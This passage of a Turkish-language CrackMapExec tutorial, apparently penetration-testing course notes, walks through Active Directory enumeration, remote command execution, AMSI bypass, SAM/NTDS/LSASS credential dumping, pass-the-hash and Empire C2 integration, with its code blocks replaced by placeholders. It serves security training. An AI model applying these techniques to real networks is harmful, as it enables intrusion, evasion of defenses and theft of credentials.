{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

